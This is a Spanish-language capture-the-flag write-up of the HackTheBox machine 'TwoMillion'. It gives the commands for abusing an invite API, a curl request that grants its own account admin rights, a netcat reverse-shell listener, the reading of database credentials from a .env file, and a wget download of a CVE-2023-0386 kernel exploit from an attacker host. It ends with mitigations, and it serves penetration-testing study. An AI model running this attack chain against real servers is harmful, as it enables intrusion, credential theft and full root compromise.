# 🛡 TwoMillion – HackTheBox

![HTB Badge](https://img.shields.io/badge/HackTheBox-TwoMillion-brightgreen?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=flat-square)
![Category](https://img.shields.io/badge/Category-Web_Exploitation-red?style=flat-square)

---

## Resumen Ejecutivo

**TwoMillion** es una máquina de HackTheBox que presenta una aplicación web protegida por un sistema de invitaciones. El reto incluye **reconocimiento web**, explotación de una **API mal configurada**, obtención de ejecución remota de comandos (RCE) y **escalada de privilegios a root** mediante la vulnerabilidad **CVE-2023-0386**.

**Impacto en entorno real**: Compromiso total del servidor, robo de credenciales internas y acceso root.

---

## 🛠 Metodología

| Herramienta               | Uso principal |
|---------------------------|--------------|
| `nmap`                    | Descubrimiento de puertos y servicios |
| `Burp Suite`              | Interceptar tráfico y extraer cookies |
| `curl` + `jq`              | Interacción con la API y parseo de JSON |
| `ROT13 / Base64`          | Decodificación de mensajes |
| `nc` (netcat)             | Recepción de shells inversas |
| `Python3 -m http.server`  | Transferencia de exploits |
| Exploit CVE-2023-0386     | Escalada de privilegios a root |

---

## Ejecución paso a paso

### 1. Reconocimiento inicial
```bash
nmap -sC -sV -Pn 10.10.11.221
echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```
<img width="622" height="314" alt="Captura de pantalla 2025-08-13 100238" src="https://github.com/user-attachments/assets/ff6ca6c4-c23a-4fc0-ae7b-998ccec273fb" />
<img width="622" height="100" alt="Captura de pantalla 2025-08-13 100248" src="https://github.com/user-attachments/assets/7967f05f-f57d-4b43-8eb0-2f284240c0f9" />

## 2. Descubrimiento de endpoint oculto
Ingreso en la pagina asociada a la IP objetivo.
En `inviteapi.min.js` se encontró código JavaScript ofuscado.  
Tras desofuscarlo se identificó el endpoint:
http://2million.htb/api/v1/invite/how/to/generate

<img width="1265" height="588" alt="Captura de pantalla 2025-08-13 100303" src="https://github.com/user-attachments/assets/d62a3012-3daf-4ddd-ab45-e89c22545f5e" />
<img width="1265" height="588" alt="Captura de pantalla 2025-08-13 100859" src="https://github.com/user-attachments/assets/0fcb71a6-d012-4cb3-b2aa-dd569fbe5809" />

## 3. Generación de código de invitación
```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```
<img width="1126" height="354" alt="Captura de pantalla 2025-08-13 100920" src="https://github.com/user-attachments/assets/03ed922e-c837-4bb3-b615-c83d77eef4b2" />

Respuesta en ROT13 → decodificada online.
POST a /api/v1/invite/generate devuelve Base64 → decodificado → código de invitación.

## 4. Registro y análisis con Burp Suite

<img width="438" height="554" alt="Captura de pantalla 2025-08-13 102719" src="https://github.com/user-attachments/assets/5eda7e34-285f-4560-a9bc-efe10f69961f" />

Una vez obtenido el código, nos registramos exitosamente. Dentro de la página empiezo a buscar vulnerabilidades a explotar. Encuentro un apartado para descargar un VPN.
uso Burp Suite para capturar cookies y mapear endpoints.
<img width="1560" height="761" alt="Captura de pantalla 2025-08-13 104913" src="https://github.com/user-attachments/assets/0e9e8323-0ca1-4a4c-a40f-b318643bf720" />

## 5. Escalada a admin vía API
Ya con el identificador empiezo a aprovechar la API débil y uso el comando `curl` con distintos parametros para obtener información.

Endpoint descubierto:
```bash
/api/v1/admin/settings/update
```
<img width="660" height="458" alt="Captura de pantalla 2025-08-13 105230" src="https://github.com/user-attachments/assets/5089e60c-c707-46d2-9775-f6c52d61438c" />
Interesante, menciona poder modificar la configuración de los usuarios.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
--cookie "PHPSESSID=<cookie>" \
--header "Content-Type: application/json" \
--data '{"email": "ian@rooted.com", "is_admin": 1}' | jq
```

Al estar mal configurado, los usuarios pueden aprovecharse de eso para añadirse a permisos a si mismos.
# 📌 Resultado: is_admin: 1.

---
## 6. Reverse Shell
Como descubrí que la Web ofrece VPNs en función del usuario, y estar definidos como usuarios:
### En Maquina atacante:
Abro una segunda terminal donde escucho en el puerto 443.
```bash
nc -nlvp 443
```

## En Maquina objetivo:
<img width="777" height="98" alt="Captura de pantalla 2025-08-13 151425" src="https://github.com/user-attachments/assets/5ede914f-5501-44c6-b776-50ca4397c543" />

# 📌 Logramos acceso como www-data.

## 7. Enumeración interna

Flag de usuario obtenida en /.

voy a la carpeta html y hago un ls -la y me fijo en un mensaje .ev
```bash
/var/www/html/: cat .env
```
información relevant en .env:
```
DB_USERNAME=Admin
DB_PASSWORD=SuperDuperPass123
```
<img width="1302" height="655" alt="Captura de pantalla 2025-08-13 153251" src="https://github.com/user-attachments/assets/78b67315-0b50-40fa-871b-f3ec0199d8b4" />

Hago login como admin con las credenciales que acabo de encontrar:
```
su admin
```
# 📌 Logramos acceso como admin

## 8. Escalada a root – CVE-2023-0386

filtro busqueda de directorios del admin, y encuentro ```/var/mail/admin```
y encuentro correo interno menciona problemas con OverlayFS/FUSE.
<img width="1321" height="284" alt="Captura de pantalla 2025-08-13 153944" src="https://github.com/user-attachments/assets/cb29c40b-e6ae-4b55-83aa-1566189d2e80" />

Me apresuro a Googlear y encuentro:
Kernel vulnerable a CVE-2023-0386.

Descargo un exploit en GitHub desde mi propia maquina y lo transfiero a la maquina objetivo.
Transferencia del exploit:

## En maquina atacante:
```python3 -m http.server 8080```

## En objetivo:
```wget http://<IP_atacante>/archivo.zip```

Y procedemos a ejecutar el [Exploit](https://github.com/puckiestyle/CVE-2023-0386)

# [📌 Obtenemos acceso root.](https://labs.hackthebox.com/achievement/machine/2448097/547)

---
## Análisis técnico

**Vulnerabilidades explotadas:**

- Código ofuscado expuesto → fuga de endpoints.

- Lógica de API débil → generación de invitaciones.

- Falta de control de acceso en /admin/settings/update.

- RCE vía /admin/vpn/generate.

- Escalada local CVE-2023-0386.

## Mitigaciones

- Evitar exponer endpoints sensibles en frontend.

- Validar privilegios en backend.

- Parchear kernel y librerías críticas.

- Segmentar entornos (dev/prod).

## Reflexión final

Este reto demuestra cómo una cadena de vulnerabilidades, desde fallos lógicos en API hasta kernel exploits, puede llevar a un compromiso total del sistema.

## Habilidades Reforzadas

| Habilidades |
|-------------|
| Enumeración web |
| API fuzzing |
| Post-explotación y escalada local |
| Uso de exploits CVE en contexto real |


## Referencias

[HackTheBox – TwoMillion](https://app.hackthebox.com/machines/TwoMillion)

[CVE-2023-0386 – OverlayFS Local Privilege Escalation](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0386)

[ROT13 Cipher](https://rot13.com/)

[Base64 Decode](https://www.base64decode.org/)
